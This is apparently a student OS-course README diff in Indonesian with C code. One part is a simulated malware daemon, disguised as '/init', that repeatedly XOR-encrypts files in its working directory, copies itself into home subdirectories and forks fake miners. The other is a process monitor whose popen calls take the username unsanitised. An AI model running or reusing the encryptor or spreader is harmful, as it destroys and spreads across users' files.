@@ -478,8 +478,567 @@ void note_log(const char *format, ...) {
 - Penyebabnya karena file tersebut masih terdapat karakter yang tidak termasuk ke dalam algoritma base64 sehingga file di lewati, maka dari itu untuk mengatasinya kita membuat fungsi clean_filename untuk menghilangkan karakter yang tidak diinginkan tersebut.
 - Karena karakter itu juga, maka pada saat melakukan decrypt tidak semua file berhasil di decrypt dan dipindahkan ke folder quarantine.
 
-# soal 3
+# Soal 3
+dikerjakan oleh Muhammad Ahsani Taqwiim Rakhman (5027241099) 
 
-dikerjakan oleh Muhammad Ahsani Taqwiim Rakhman
-
+- 1. `wannacryptor` mengenkripsi file secara rekursif menggunakan XOR.
+- 2. `trojan_wrm` menyalin biner malware ke direktori lain.
+- 3. `rodok.exe` fork "miners" yang mensimulasikan penambangan kripto dengan menghasilkan hash acak.
+  
+Library
 ```bash
+#include <stdio.h>        
+#include <stdlib.h>       
+#include <unistd.h>       
+#include <sys/types.h>    
+#include <sys/wait.h>     
+#include <string.h>      
+#include <time.h>         
+#include <sys/stat.h>     
+#include <fcntl.h>        
+#include <dirent.h>      
+#include <errno.h>       
+#include <signal.h>       
+#include <sys/prctl.h>    
+```
+`#include <stdio.h>`: untuk menginput dan output
+`#include <stdlib.h>`:Memory allocation, exit()
+`#include <unistd.h>`:Forking, file operations
+`#include <sys/types.h>`:pid_t, size_t, etc.
+`#include <sys/wait.h>`:wait()
+`#include <string.h>`:String
+`#include <time.h> `:time(), strftime()
+`#include <sys/stat.h>`:File info (stat)
+`#include <fcntl.h>`:open, read, write
+`#include <dirent.h>`:Penjelajahan direktori
+`#include <errno.h>`:report Error
+`#include <signal.h>`:Signal
+`#include <sys/prctl.h>`:prctl() untuk proses penamaan
+
+##wannacryptor
+xor_encrypt
+```bash
+void xor_encrypt_file(const char *path, unsigned char key) {
+    FILE *file = fopen(path, "rb");
+    if (!file) return;
+
+    fseek(file, 0, SEEK_END);
+    long size = ftell(file);
+    rewind(file);
+
+    unsigned char *data = malloc(size);
+    if (!data) {
+        fclose(file);
+        return;
+    }
+
+    fread(data, 1, size, file);
+    fclose(file);
+
+    for (long i = 0; i < size; i++) {
+        data[i] ^= key;
+    }
+
+    file = fopen(path, "wb");
+    if (file) {
+        fwrite(data, 1, size, file);
+        fclose(file);
+    }
+
+    free(data);
+}
+```
+- `FILE *file = fopen(path, "rb");` membuka file untuk dibaca
+- ` fread(data, 1, size, file);
+    fclose(file);` membaca semua konten file ke dalam memori
+- `for (long i = 0; i < size; i++) {
+        data[i] ^= key;
+    }` Meng-XOR-kan setiap byte dengan key.
+- `file = fopen(path, "wb");
+    if (file) {
+        fwrite(data, 1, size, file);
+        fclose(file);
+    }` Menuliskan kembali konten terenkripsi ke dalam file.
+
+  Encrypt_directory
+  ```bash
+  void encrypt_directory(const char *dir_path, unsigned char key) {
+    DIR *dir = opendir(dir_path);
+    if (!dir) return;
+
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
+            continue;
+
+        char full_path[512];
+        snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, entry->d_name);
+
+        struct stat st;
+        if (stat(full_path, &st) == 0) {
+            if (S_ISREG(st.st_mode)) {
+                xor_encrypt_file(full_path, key);
+            } else if (S_ISDIR(st.st_mode)) {
+                encrypt_directory(full_path, key);
+            }
+        }
+    }
+
+    closedir(dir);
+  }
+  ```
+  - `DIR *dir = opendir(dir_path);` membuka directory
+  - `if (S_ISREG(st.st_mode)) { 
+                xor_encrypt_file(full_path, key);  ` jika file reguler maka akan diencrypt
+  -  `else if (S_ISDIR(st.st_mode)) { 
+                encrypt_directory(full_path, key);  ` jika itu directory maka akan di recurse
+  
+  Wannacryptor
+  ```bash
+  void wannacryptor() {
+    prctl(PR_SET_NAME, "wannacryptor");
+    while (1) {
+        unsigned char key = (unsigned char)(time(NULL) & 0xFF);
+        char cwd[256];
+        getcwd(cwd, sizeof(cwd));
+        encrypt_directory(cwd, key);
+        sleep(30);
+    }
+  }
+   ```
+  - Mendapatkan direktori saat ini menggunakan `getcwd()`.
+
+- Menggunakan key XOR sederhana yang berasal dari `time()` saat ini.
+
+- Memanggil `encrypt_directory()` untuk mengenkripsi secara rekursif.
+
+- Tidur selama 30 detik sebelum mengulang.
+  
+##trojan.wrm
+```bash
+void trojan_wrm() {
+    prctl(PR_SET_NAME, "trojan.wrm");
+    char *binary_path = "/proc/self/exe";
+    const char *home = getenv("HOME");
+    if (!home) return;
+
+    while (1) {
+        DIR *dir = opendir(home);
+        if (!dir) return;
+
+        struct dirent *entry;
+        while ((entry = readdir(dir)) != NULL) {
+            if (entry->d_type == DT_DIR && strcmp(entry->d_name, ".") != 0 && strcmp(entry->d_name, "..") != 0) {
+                char target_path[512];
+                snprintf(target_path, sizeof(target_path), "%s/%s/runme", home, entry->d_name);
+
+                int src_fd = open(binary_path, O_RDONLY);
+                int dst_fd = open(target_path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+
+                if (src_fd >= 0 && dst_fd >= 0) {
+                    char buffer[4096];
+                    ssize_t n;
+                    while ((n = read(src_fd, buffer, sizeof(buffer))) > 0) {
+                        write(dst_fd, buffer, n);
+                    }
+                    close(src_fd);
+                    close(dst_fd);
+                }
+            }
+        }
+        closedir(dir);
+        sleep(30);
+    }
+}
+```
+- Mendapatkan jalur binernya sendiri `(/proc/self/exe)`.
+- Melakukan pengulangan melalui direktori `$HOME`.
+- Untuk setiap subdirektori, membuat salinan bernama `runme`.
+
+##rodok.exe
+miner.loop
+```bash
+void miner_loop(int id) {
+    char name[32];
+    sprintf(name, "mine-crafter-%d", id);
+    prctl(PR_SET_NAME, name);
+
+    while (1) {
+        int delay = 3 + rand() % 28;
+        sleep(delay);
+
+        char hash[65];
+        for (int i = 0; i < 64; i++) {
+            int r = rand() % 16;
+            hash[i] = "0123456789abcdef"[r];
+        }
+        hash[64] = '\0';
+
+        time_t now = time(NULL);
+        struct tm *t = localtime(&now);
+        char timestamp[64];
+        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", t);
+
+        FILE *log = fopen("/tmp/.miner.log", "a");
+        if (log) {
+            fprintf(log, "[%s][Miner %02d] %s\n", timestamp, id, hash);
+            fclose(log);
+        }
+    }
+}
+```
+- `int delay = 3 + rand() % 28;
+        sleep(delay);` Sleep secara acak antara 3–30 detik.
+- `char hash[65];
+        for (int i = 0; i < 64; i++) {
+            int r = rand() % 16;
+            hash[i] = "0123456789abcdef"[r];
+        }
+        hash[64] = '\0';` Membuat hash "cryptomining"
+- ` time_t now = time(NULL);
+        struct tm *t = localtime(&now);
+        char timestamp[64];
+        strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", t);`Menambahkannya ke berkas log dengan timestamp
+- `fprintf(log, "[%s][Miner %02d] %s\n", timestamp, id, hash);
+            fclose(log);` memperlihatkan timestamp dan pid
+  ##rodok.exe
+  ```bash
+   prctl(PR_SET_NAME, "rodok.exe");
+    for (int i = 0; i < MAX_MINERS; i++) {
+        pid_t pid = fork();
+        if (pid == 0) {
+            miner_loop(i);
+            exit(0);
+        }
+    }
+    while (1) pause();
+  }
+  ```
+  - Membuat child process `MAX_MINERS`.
+  - Setiap child mensimulasikan penambangan kripto selamanya.
+
+## daemonize
+```bash
+void daemonize() {
+    pid_t pid = fork();
+    if (pid < 0) exit(EXIT_FAILURE);
+    if (pid > 0) exit(EXIT_SUCCESS);
+
+    umask(0);
+    setsid();
+    if (chdir("/")) exit(EXIT_FAILURE);
+
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+
+    prctl(PR_SET_NAME, "/init");
+}
+```
+- `fork()` dan keluar dari induk untuk berjalan di latar belakang.
+- Melepas dari terminal dengan `(setsid())`.
+- Mengubah direktori kerja ke /.
+- Menutup stdin, stdout, stderr.
+- Mengganti nama proses menggunakan `prctl()` menjadi `/init`.
+
+  ##main()
+  ```bash
+  int main() {
+    srand(time(NULL));
+    daemonize();
+
+    pid_t pid;
+
+    pid = fork();
+    if (pid == 0) {
+        wannacryptor();
+        exit(0);
+    }
+
+    pid = fork();
+    if (pid == 0) {
+        trojan_wrm();
+        exit(0);
+    }
+
+    pid = fork();
+    if (pid == 0) {
+        rodok_exe();
+        exit(0);
+    }
+
+    while (1) pause();
+    return 0;
+  }
+  ```
+- `srand()` menghasilkan keacakan.
+
+- Memanggil `daemonize()` untuk beralih ke latar belakang.
+
+- Melakukan fork dan meluncurkan:
+
+`wannacryptor()` – Encryptor
+
+`trojan_wrm()` – Spreader
+
+`rodok_exe()` – Fork bomb cryptominer
+
+- Menjaga daemon induk tetap berjalan dengan `pause()`.
+  ## output
+  -cat /tmp/.miner.log
+  ![Screenshot 2025-04-12 205912](https://github.com/user-attachments/assets/1c2c02f2-a9c7-4617-8626-9f0d890382e5)
+
+  -ps axjf
+  ![Screenshot 2025-04-12 215640](https://github.com/user-attachments/assets/61febe0a-802e-49ef-98bf-19bc3c0fce85)
+
+  # soal 4
+  dikerjakan oleh Muhammad Ahsani Taqwiim Rakhman (5027241099)
+
+  membuat `debugmon.log`untuk menyimpan log
+  ```bash
+  void write_log(const char* process_name, const char* status) {
+    time_t now = time(NULL);
+    struct tm *tm = localtime(&now);
+    char timestamp[25]; 
+    
+    strftime(timestamp, sizeof(timestamp), "[%d:%m:%Y]-[%H:%M:%S]", tm);
+    
+    FILE *log = fopen(LOG_FILE, "a");
+    if (log) {
+        fprintf(log, "%s_%s_%s\n", timestamp, process_name, status);
+        fclose(log);
+    }
+  }
+  ```
+- `time_t now = time(NULL);` mendapatkan waktu saat ini untuk dimasukkan di log
+-  `strftime(timestamp, sizeof(timestamp), "[%d:%m:%Y]-[%H:%M:%S]", tm);` ditulis dengan format [dd:mm:yyyy]-[hh:mm:ss]_processname_STATUS
+## list
+```bash
+void list_user_processes(const char *user) {
+    char cmd[BUFFER_SIZE];
+    snprintf(cmd, BUFFER_SIZE, "ps -u %s -o pid,comm,%%cpu,%%mem", user);
+    
+    FILE *ps = popen(cmd, "r");
+    if (ps) {
+        char buf[BUFFER_SIZE];
+        while (fgets(buf, BUFFER_SIZE, ps)) {
+            printf("%s", buf);
+            
+            // Log running processes
+            int pid;
+            char name[BUFFER_SIZE];
+            if (sscanf(buf, "%d %s", &pid, name) == 2) {
+                write_log(name, "RUNNING");
+            }
+        }
+        pclose(ps);
+    }
+}
+```
+- Mencantumkan semua proses dari pengguna tertentu `(ps -u <user>)`.
+- Mencatat setiap proses sebagai `RUNNING `
+## daemon
+```bash
+void start_daemon(const char *user) {
+    pid_t pid = fork();
+    if (pid < 0) {
+        perror("fork");
+        exit(1);
+    }
+    
+    if (pid > 0) { 
+        FILE *pf = fopen(PID_FILE, "w");
+        if (pf) {
+            fprintf(pf, "%d", pid);
+            fclose(pf);
+        }
+        exit(0);
+    }
+    
+    umask(0);
+    setsid();
+    chdir("/");
+    close(STDIN_FILENO);
+    close(STDOUT_FILENO);
+    close(STDERR_FILENO);
+    
+    while (1) {
+        char cmd[BUFFER_SIZE];
+        snprintf(cmd, BUFFER_SIZE, "ps -u %s -o pid,comm", user);
+        
+        FILE *ps = popen(cmd, "r");
+        if (ps) {
+            char buf[BUFFER_SIZE];
+            fgets(buf, BUFFER_SIZE, ps); // Skip header
+            
+            while (fgets(buf, BUFFER_SIZE, ps)) {
+                int pid;
+                char name[BUFFER_SIZE];
+                if (sscanf(buf, "%d %s", &pid, name) == 2) {
+                    write_log(name, "RUNNING");
+                }
+            }
+            pclose(ps);
+        }
+        sleep(5);
+    }
+}
+```
+- fork proses saat ini untuk membuat daemon.
+- Menulis PID daemon ke `debugmon_daemon.pid`
+
+##.stop
+```bash
+void stop_monitoring(const char *user) {
+    FILE *pf = fopen(PID_FILE, "r");
+    if (!pf) {
+        printf("No active monitoring\n");
+        return;
+    }
+    
+    pid_t pid;
+    fscanf(pf, "%d", &pid);
+    fclose(pf);
+    
+    if (kill(pid, SIGTERM) == -1) {
+        perror("kill");
+    } else {
+        remove(PID_FILE);
+    }
+}
+```
+- Membaca PID daemon dari `debugmon_daemon.pid`.
+- Mengirim `SIGTERM` ke PID tersebut untuk mematikan daemon.
+- Menghapus berkas PID.
+## fail
+```bash
+oid fail_processes(const char *user) {
+    char cmd[BUFFER_SIZE];
+    snprintf(cmd, BUFFER_SIZE, "ps -u %s -o pid,comm --no-headers", user);
+    
+    FILE *ps = popen(cmd, "r");
+    if (ps) {
+        char buf[BUFFER_SIZE];
+        while (fgets(buf, BUFFER_SIZE, ps)) {
+            int pid;
+            char name[BUFFER_SIZE];
+            if (sscanf(buf, "%d %s", &pid, name) == 2) {
+                if (kill(pid, SIGKILL) == 0) {
+                    write_log(name, "FAILED");
+                }
+            }
+        }
+        pclose(ps);
+    }
+    
+    // Block user from new processes
+    FILE *blocked = fopen(BLOCKED_USERS_FILE, "a");
+    if (blocked) {
+        fprintf(blocked, "%s\n", user);
+        fclose(blocked);
+    }
+}
+```
+-Menggunakan `ps` untuk mendapatkan semua proses pengguna.
+-Mengirim `SIGKILL` ke masing-masing proses dan mencatatnya sebagai "FAILED".
+-Menambahkan pengguna ke `blocks_users.txt` untuk mensimulasikan pemblokiran proses lebih lanjut.
+## revert
+```bash
+void revert_user(const char *user) {
+    FILE *blocked = fopen(BLOCKED_USERS_FILE, "r");
+    if (blocked) {
+        char tmpfile[] = "/tmp/debugmon.XXXXXX";
+        int fd = mkstemp(tmpfile);
+        FILE *tmp = fdopen(fd, "w");
+        
+        char buf[BUFFER_SIZE];
+        while (fgets(buf, BUFFER_SIZE, blocked)) {
+            if (!strstr(buf, user)) {
+                fputs(buf, tmp);
+            }
+        }
+        fclose(blocked);
+        fclose(tmp);
+        rename(tmpfile, BLOCKED_USERS_FILE);
+    }
+    
+    char cmd[BUFFER_SIZE];
+    snprintf(cmd, BUFFER_SIZE, "ps -u %s -o comm --no-headers", user);
+    
+    FILE *ps = popen(cmd, "r");
+    if (ps) {
+        char name[BUFFER_SIZE];
+        while (fgets(name, BUFFER_SIZE, ps)) {
+            // Remove newline if present
+            name[strcspn(name, "\n")] = 0;
+            write_log(name, "RUNNING");
+        }
+        pclose(ps);
+    }
+}
+```
+- Membuka file `blocks_users.txt`, menghapus nama pengguna.
+- Mencantumkan proses saat ini untuk pengguna dan mencatatnya lagi sebagai "RUNNING".
+  ## main()
+  ```bash
+  int main(int argc, char *argv[]) {
+    if (argc < 3) {
+        printf("Usage: %s <command> <user>\n", argv[0]);
+        printf("Commands: list, daemon, stop, fail, revert\n");
+        return 1;
+    }
+    
+    const char *cmd = argv[1];
+    const char *user = argv[2];
+    
+    if (strcmp(cmd, "list") == 0) {
+        list_user_processes(user);
+    } else if (strcmp(cmd, "daemon") == 0) {
+        start_daemon(user);
+    } else if (strcmp(cmd, "stop") == 0) {
+        stop_monitoring(user);
+    } else if (strcmp(cmd, "fail") == 0) {
+        fail_processes(user);
+    } else if (strcmp(cmd, "revert") == 0) {
+        revert_user(user);
+    } else {
+        printf("Invalid command\n");
+        return 1;
+    }
+    
+    return 0;
+  } 
+  ```
+  - Berdasarkan perintah masukan, memanggil fungsi yang sesuai perintah.
+  ## output
+  -list
+![Screenshot 2025-04-11 224421](https://github.com/user-attachments/assets/610f9a8c-74a0-49df-a7c4-de2ce6f8dffe)
+
+-daemon and stop
+
+![image](https://github.com/user-attachments/assets/cc2b5bc8-d105-4cff-84ca-864b69a63f87)
+
+-debugmon.log setelah stop
+
+![image](https://github.com/user-attachments/assets/09ef6c12-fd4a-416b-bc3d-e65dc161125e)
+
+-fail
+
+![image](https://github.com/user-attachments/assets/e8b31be2-f4b9-4183-8ff7-3cd158a289e3)
+
+- debugmon.log setelah fail
+
+![image](https://github.com/user-attachments/assets/c58358b5-9320-42f3-b674-704871d4651f)
+
+-revert dan hasil debugmon.log
+
+![image](https://github.com/user-attachments/assets/cc56f484-35c3-4273-8b9b-6fd53052c47c)
+
+
+
+
+
+
+
+
+  
